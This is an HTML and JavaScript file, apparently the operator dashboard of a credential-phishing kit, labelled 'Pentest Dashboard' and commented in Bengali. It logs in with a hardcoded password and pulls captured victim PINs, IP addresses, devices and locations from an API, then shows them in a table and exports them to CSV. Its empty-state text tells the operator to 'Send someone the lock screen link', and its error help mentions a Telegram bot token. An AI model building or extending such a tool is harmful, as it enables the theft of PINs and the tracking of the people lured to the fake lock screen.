<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',sans-serif; background:#0f0f1a; color:#e0e0e0; min-height:100vh; }
        
        .login-container { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
        .login-box { background:#1a1a2e; padding:40px; border-radius:20px; width:100%; max-width:400px; border:1px solid rgba(255,255,255,0.1); }
        .login-box h1 { font-size:24px; margin-bottom:20px; }
        .login-box input { width:100%; padding:14px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.15); border-radius:10px; color:#fff; font-size:16px; outline:none; margin-bottom:15px; }
        .login-box input:focus { border-color:#ff4444; }
        .login-box button { width:100%; padding:14px; background:linear-gradient(135deg,#ff4444,#cc0000); border:none; border-radius:10px; color:#fff; font-size:16px; font-weight:700; cursor:pointer; }
        .login-error { color:#ff4444; font-size:14px; margin-bottom:10px; text-align:center; min-height:20px; }
        
        .dashboard { display:none; }
        .header { background:#1a1a2e; padding:16px 24px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.1); }
        .header h1 { font-size:20px; }
        .logout-btn { background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); color:#fff; padding:8px 16px; border-radius:8px; cursor:pointer; }
        
        .content { padding:24px; max-width:1200px; margin:0 auto; }
        
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:16px; margin-bottom:24px; }
        .stat-card { background:#1a1a2e; padding:20px; border-radius:14px; text-align:center; }
        .stat-card .num { font-size:36px; font-weight:800; color:#ff4444; }
        .stat-card .lbl { font-size:13px; color:#888; }
        
        .controls { margin-bottom:16px; display:flex; gap:10px; flex-wrap:wrap; }
        .btn { padding:10px 20px; border:none; border-radius:8px; font-size:13px; font-weight:600; cursor:pointer; color:#fff; }
        .btn-refresh { background:#448aff; }
        .btn-export { background:#00c853; }
        .btn-clear { background:#ff4444; }
        
        .table-container { background:#1a1a2e; border-radius:14px; overflow-x:auto; }
        table { width:100%; border-collapse:collapse; }
        th { padding:14px 16px; text-align:left; font-size:12px; color:#888; text-transform:uppercase; border-bottom:1px solid rgba(255,255,255,0.06); }
        td { padding:12px 16px; border-bottom:1px solid rgba(255,255,255,0.04); font-size:14px; }
        .pin-badge { background:#ff4444; color:#fff; padding:4px 12px; border-radius:6px; font-family:monospace; font-weight:700; letter-spacing:1px; }
        .ip-text { font-family:monospace; color:#448aff; }
        .empty-state { text-align:center; padding:60px; color:#666; }
        .empty-state .icon { font-size:48px; margin-bottom:16px; }
        
        #status { font-size:13px; color:#888; margin:10px 0; }
        .error-box { background:rgba(255,68,68,0.1); border:1px solid rgba(255,68,68,0.3); border-radius:10px; padding:20px; margin:20px 0; color:#ff6b6b; }
    </style>
</head>
<body>

<div id="loginSection" class="login-container">
    <div class="login-box">
        <h1>🔒 Admin Panel</h1>
        <div id="loginError" class="login-error"></div>
        <input type="password" id="passwordInput" placeholder="Enter admin password" onkeypress="if(event.key==='Enter')doLogin()">
        <button onclick="doLogin()">🔑 LOGIN</button>
    </div>
</div>

<div id="dashboardSection" class="dashboard">
    <div class="header">
        <h1>📊 Pentest Dashboard <span id="count" style="background:#ff4444;padding:2px 10px;border-radius:12px;font-size:14px;margin-left:10px;">0</span></h1>
        <button class="logout-btn" onclick="doLogout()">🚪 Logout</button>
    </div>
    
    <div class="content">
        <div class="stats">
            <div class="stat-card"><div class="num" id="sTotal">0</div><div class="lbl">Total PINs</div></div>
            <div class="stat-card"><div class="num" id="sUnique">0</div><div class="lbl">Unique IPs</div></div>
        </div>
        
        <div class="controls">
            <button class="btn btn-refresh" onclick="loadData()">🔄 Refresh</button>
            <button class="btn btn-export" onclick="exportCSV()">📥 Export</button>
            <button class="btn btn-clear" onclick="clearData()">🗑️ Clear All</button>
        </div>
        
        <div id="status">⏳ Loading...</div>
        
        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>PIN</th>
                        <th>IP</th>
                        <th>Device</th>
                        <th>Location</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody id="dataBody">
                    <tr><td colspan="6"><div class="empty-state"><div class="icon">📡</div><p>Waiting for data...</p></div></td></tr>
                </tbody>
            </table>
        </div>
        
        <div id="errorBox" class="error-box" style="display:none;"></div>
    </div>
</div>

<script>
// =============================================
// কনফিগারেশন — আপনার পাসওয়ার্ড
// =============================================
const ADMIN_PASSWORD = 'Afjal7380';
const API_BASE = '/api';
let isLoggedIn = false;
let allData = [];

// =============================================
// লগইন — ক্লায়েন্ট-সাইড (কোনো API কল নয়)
// =============================================
function doLogin() {
    const pwd = document.getElementById('passwordInput').value;
    document.getElementById('loginError').textContent = '';
    
    if (pwd === ADMIN_PASSWORD) {
        isLoggedIn = true;
        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('dashboardSection').style.display = 'block';
        loadData();
        setInterval(loadData, 10000);
    } else {
        document.getElementById('loginError').textContent = '❌ ভুল পাসওয়ার্ড!';
    }
}

function doLogout() {
    isLoggedIn = false;
    document.getElementById('dashboardSection').style.display = 'none';
    document.getElementById('loginSection').style.display = 'flex';
    document.getElementById('passwordInput').value = '';
}

// =============================================
// API থেকে ডাটা লোড
// =============================================
async function loadData() {
    if (!isLoggedIn) return;
    
    document.getElementById('status').textContent = '⏳ Loading...';
    document.getElementById('errorBox').style.display = 'none';
    
    try {
        const resp = await fetch(API_BASE + '/data', {
            headers: { 'Authorization': 'Bearer ' + ADMIN_PASSWORD },
            signal: AbortSignal.timeout(10000)
        });
        
        if (!resp.ok) {
            throw new Error('Server returned ' + resp.status);
        }
        
        const result = await resp.json();
        
        if (result.status === 'ok') {
            allData = result.data || [];
            renderTable();
            updateStats();
            document.getElementById('status').textContent = '✅ Last updated: ' + new Date().toLocaleTimeString();
        } else {
            throw new Error(result.error || 'Unknown error');
        }
    } catch(err) {
        document.getElementById('status').textContent = '❌ Error: ' + err.message;
        document.getElementById('errorBox').style.display = 'block';
        document.getElementById('errorBox').innerHTML = '<strong>⚠️ Connection Error</strong><br>' + err.message + '<br><br>Try:<br>1. Redeploy on Vercel<br>2. Check API routes exist<br>3. Check Telegram bot token is set in Environment Variables';
    }
}

function updateStats() {
    const total = allData.length;
    const uniqueIPs = new Set(allData.map(d => d.ip)).size;
    document.getElementById('sTotal').textContent = total;
    document.getElementById('sUnique').textContent = uniqueIPs;
    document.getElementById('count').textContent = total;
}

function renderTable() {
    const tbody = document.getElementById('dataBody');
    
    if (allData.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6"><div class="empty-state"><div class="icon">📡</div><p>No captures yet. Send someone the lock screen link!</p></div></td></tr>';
        return;
    }
    
    let html = '';
    allData.forEach(function(d, i) {
        const time = d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A';
        const deviceClass = (d.device||'').includes('Android') ? '🤖' : (d.device||'').includes('iOS') ? '🍎' : (d.device||'').includes('Windows') ? '💻' : '📱';
        html += '<tr>' +
            '<td>' + (i+1) + '</td>' +
            '<td><span class="pin-badge">' + (d.pin||'') + '</span></td>' +
            '<td><span class="ip-text">' + (d.ip||'') + '</span></td>' +
            '<td>' + deviceClass + ' ' + (d.device||'') + '</td>' +
            '<td>' + (d.location||'N/A') + '</td>' +
            '<td>' + time + '</td>' +
        '</tr>';
    });
    tbody.innerHTML = html;
}

function exportCSV() {
    if (allData.length === 0) return alert('No data');
    let csv = 'Time,PIN,IP,Device,Location,Browser\n';
    allData.forEach(function(d) {
        csv += (d.timestamp||'') + ',' + (d.pin||'') + ',' + (d.ip||'') + ',' + (d.device||'') + ',' + (d.location||'') + ',' + (d.browser||'') + '\n';
    });
    const blob = new Blob([csv], {type:'text/csv'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'captures_' + new Date().toISOString().slice(0,10) + '.csv';
    a.click();
}

async function clearData() {
    if (!confirm('Delete all data?')) return;
    try {
        await fetch(API_BASE + '/delete', {
            method: 'POST',
            headers: {'Content-Type':'application/json','Authorization':'Bearer '+ADMIN_PASSWORD},
            body: JSON.stringify({id:'all'})
        });
        loadData();
    } catch(e) {
        alert('Error: ' + e.message);
    }
}
</script>
</body>
</html>
